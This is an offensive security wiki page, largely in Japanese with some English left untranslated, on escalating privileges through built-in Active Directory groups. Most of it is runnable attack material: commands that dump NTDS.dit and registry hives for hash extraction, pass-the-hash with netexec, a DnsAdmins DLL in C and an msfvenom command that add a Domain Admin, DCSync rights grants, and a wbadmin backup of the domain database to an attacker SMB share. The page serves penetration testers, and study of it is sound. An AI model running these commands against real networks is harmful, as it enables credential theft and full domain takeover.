# 特権グループ

{{#include ../../banners/hacktricks-training.md}}

## 管理権限を持つ代表的なグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループは、ドメイン上で管理者ではないアカウントやグループを作成する権限を持っています。さらに、Domain Controller (DC) へのローカルログインを可能にします。

このグループのメンバーを特定するには、次のコマンドを実行します:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加が許可されており、DCへのローカルログインも可能です。

## AdminSDHolder グループ

The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.
  
The **AdminSDHolder** group's Access Control List (ACL) は、Active Directory 内のすべての「protected groups」（高権限グループを含む）の権限を設定するため重要です。この仕組みは、無許可の変更を防ぐことでこれらのグループのセキュリティを確保します。

An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.
  
攻撃者は **AdminSDHolder** グループの ACL を変更して標準ユーザーにフル権限を与えることでこれを悪用できます。これにより、そのユーザーはすべての保護されたグループに対する完全な制御を事実上得ます。もしこのユーザーの権限が変更または削除されても、システムの設計により1時間以内に自動的に復元されます。

Recent Windows Server documentation still treats several built-in operator groups as **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). The **SDProp** process runs on the **PDC Emulator** every 60 minutes by default, stamps `adminCount=1`, and disables inheritance on protected objects. This is useful both for persistence and for hunting stale privileged users that were removed from a protected group but still keep the non-inheriting ACL.
  
最近の Windows Server ドキュメントでも、いくつかの組み込みオペレータグループは **protected** オブジェクトとして扱われています（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins` など）。**SDProp** プロセスは既定で **PDC Emulator** 上で60分ごとに実行され、`adminCount=1` を設定し、保護されたオブジェクトの継承を無効にします。これは、永続化の手段としてだけでなく、保護されたグループから削除されたにもかかわらず継承無効のACLを保持している古い特権ユーザーを発見する際にも有用です。

Commands to review the members and modify permissions include:
メンバーを確認し権限を変更するためのコマンド例:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
復旧プロセスを迅速化するためのスクリプトが利用可能です: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

詳細は [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) を参照してください。

## AD Recycle Bin

このグループのメンバーであれば、削除された Active Directory オブジェクトを読み取ることができ、機密情報が露出する可能性があります:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
これは**以前の特権経路を復元する**のに役立ちます。削除されたオブジェクトは、`lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、古い SPNs、または後で別のオペレーターによって復元され得る削除された特権グループの DN を露出することがあります。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### ドメインコントローラーへのアクセス

DC 上のファイルへのアクセスは、ユーザーが `Server Operators` グループのメンバーでない限り制限されます。このグループに所属するとアクセス権のレベルが変更されます。

### 権限昇格

Sysinternals の `PsService` や `sc` を使用して、サービスの権限を確認・変更できます。例えば、`Server Operators` グループは特定のサービスに対してフルコントロールを持っており、任意のコマンド実行や権限昇格を可能にします:
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドは、`Server Operators` が完全なアクセス権を持ち、サービスを操作して権限昇格を行えることを示します。

## Backup Operators

`Backup Operators` グループのメンバーであると、`SeBackup` と `SeRestore` の権限により `DC01` ファイルシステムにアクセスできます。これらの権限により、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用して、明示的な許可がなくてもフォルダの横断、一覧表示、ファイルのコピーが可能になります。この処理には特定のスクリプトを使用する必要があります。

グループのメンバーを列挙するには、次を実行してください:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

これらの特権をローカルで活用するために、次の手順を実行します:

1. 必要なライブラリをインポートします:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` を有効化して確認する:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 制限されたディレクトリからファイルにアクセスしてコピーする、例えば：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

ドメインコントローラのファイルシステムに直接アクセスすると、`NTDS.dit` データベースを窃取でき、これはドメインユーザーおよびコンピュータの全てのNTLMハッシュを含みます。

#### diskshadow.exe を使用する

1. `C` ドライブのシャドウコピーを作成する:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーする:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
代わりに、ファイルのコピーには `robocopy` を使用してください:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. ハッシュ取得のために `SYSTEM` と `SAM` を抽出する:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` からすべての hashes を取得する:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 抽出後: Pass-the-Hash to DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe を使用する

1. 攻撃者マシンでSMBサーバー用のNTFSファイルシステムを設定し、ターゲットマシンにSMB認証情報をキャッシュする。
2. `wbadmin.exe` を使用してシステムバックアップと `NTDS.dit` の抽出を行う:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** グループのメンバーは、その権限を利用して、しばしば Domain Controllers 上でホストされる DNS サーバー上で任意の DLL を SYSTEM 権限でロードすることができます。これは重大な悪用の可能性をもたらします。

DnsAdmins グループのメンバーを一覧表示するには、次を使用します:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> この脆弱性により、DNSサービス（通常はDCs内）でSYSTEM権限で任意のコードを実行できます。 この問題は2021年に修正されました。

メンバーは次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）をロードさせることができます:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL が読み込まれるには、DNS サービスを再起動する必要があります（追加の権限が必要な場合があります）:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
この攻撃ベクターの詳細は ired.team を参照してください。

#### Mimilib.dll

mimilib.dll を使用してコマンド実行を行うことも可能で、特定のコマンドや reverse shells を実行するように変更できます。詳細は[この投稿](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を参照してください。

### WPAD レコードによる MitM

DnsAdmins は global query block list を無効化した後に WPAD レコードを作成して、Man-in-the-Middle (MitM) 攻撃を行うために DNS レコードを操作できます。Responder や Inveigh といったツールは、スプーフィングやネットワークトラフィックのキャプチャに使用できます。

### Event Log Readers

メンバーはイベントログにアクセスでき、平文パスワードやコマンド実行の詳細などの機密情報を見つける可能性があります:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

このグループは domain object の DACLs を変更でき、潜在的に DCSync privileges を付与する可能性があります。 このグループを悪用した privilege escalation の手法は Exchange-AD-Privesc GitHub repo に詳述されています。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
このグループのメンバーとして行動できる場合、典型的な悪用は attacker-controlled principal に [DCSync](dcsync.md) に必要なレプリケーション権限を付与することです：
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
歴史的に、**PrivExchange** は mailbox access を連鎖させ、coerced Exchange authentication と LDAP relay を利用して同じプリミティブに到達しました。たとえそのリレーパスが緩和されていても、`Exchange Windows Permissions` への直接のメンバーシップや Exchange サーバーの制御は、ドメインのレプリケーション権限を得るための高価値な経路のままです。

## Hyper-V 管理者

Hyper-V 管理者は Hyper-V へのフルアクセス権を持ち、これを悪用して仮想化された Domain Controllers を制御することができます。これにはライブの DC をクローンすることや、`NTDS.dit` ファイルから NTLM ハッシュを抽出することが含まれます。

### Exploitation Example

実際の悪用は通常、古い host-level LPE トリックではなく、**offline access to DC disks/checkpoints** を介したものです。Hyper-V ホストにアクセスできれば、オペレーターは仮想化された Domain Controller を checkpoint したり export したりして VHDX をマウントし、ゲスト内の `LSASS` に触れることなく `NTDS.dit`、`SYSTEM`、その他のシークレットを抽出できます：
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
そこから、`Backup Operators` ワークフローを再利用して `Windows\NTDS\ntds.dit` とレジストリハイブをオフラインでコピーします。

## Group Policy Creators Owners

このグループはメンバーにドメイン内で Group Policies を作成する権限を与えます。ただし、メンバーはユーザーやグループに対して group policies を適用したり、既存の GPOs を編集したりすることはできません。

重要な点は、**creator becomes owner of the new GPO** であり、通常その後に編集するのに十分な権限を得ることです。つまり、このグループは次のいずれかができる場合に興味深い存在になります：

- 悪意のある GPO を作成し、管理者を説得してターゲットの OU/domain にリンクさせる
- 既にどこか有用な場所にリンクされている、自分が作成した GPO を編集する
- 他の委任された権限（GPO をリンクできる権限）を悪用し、このグループが編集側を提供する状況で組み合わせる

実際の悪用は通常、SYSVOL-backed policy files を通じて、**Immediate Task**、**startup script**、**local admin membership**、または**user rights assignment** の変更を追加することを意味します。
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## 組織管理

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### 権限悪用とコマンド

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

このグループのメンバーを列挙するには、以下の PowerShell コマンドを使用します:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Domain Controllers 上では、このグループは危険です。デフォルトの Domain Controller Policy が **`SeLoadDriverPrivilege`** を `Print Operators` に付与しているためです。もしこのグループのメンバーの昇格済みトークンを取得できれば、その特権を有効化して署名済みだが脆弱なドライバをロードし、カーネル/SYSTEM に昇格できます。トークンの扱いの詳細は [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) を参照してください。

#### Remote Desktop Users

このグループのメンバーは Remote Desktop Protocol (RDP) を介して PC へのアクセス権が付与されています。これらのメンバーを列挙するには、PowerShell コマンドを使用します:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDPを悪用するためのさらなる洞察は、専用のpentestingリソースで見つけることができます。

#### リモート管理ユーザー

メンバーは**Windows Remote Management (WinRM)**経由でPCにアクセスできます。これらのメンバーの列挙は次の方法で行います：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** に関連するエクスプロイト手法については、専用のドキュメントを参照してください。

#### Server Operators

このグループは Domain Controllers 上でバックアップや復元の権限、システム時刻の変更、システムのシャットダウンなど、さまざまな構成を行う権限を持っています。メンバーを列挙するには、次のコマンドが示されています：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
ドメインコントローラー上では、`Server Operators`は通常、**再構成やサービスの開始/停止**を行うのに十分な権限を継承し、デフォルトのDCポリシーを通じて`SeBackupPrivilege`/`SeRestorePrivilege`も付与されます。実際には、これにより**service-control abuse**と**NTDS extraction**の橋渡しになります:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
もしサービスのACLがこのグループに変更/開始の権限を与えている場合、サービスの実行パスを任意のコマンドに向け、`LocalSystem` として起動してから元の `binPath` を復元する。サービス制御がロックダウンされている場合は、上記の `Backup Operators` の手法に戻り、`NTDS.dit` をコピーする。

## References <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddrriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
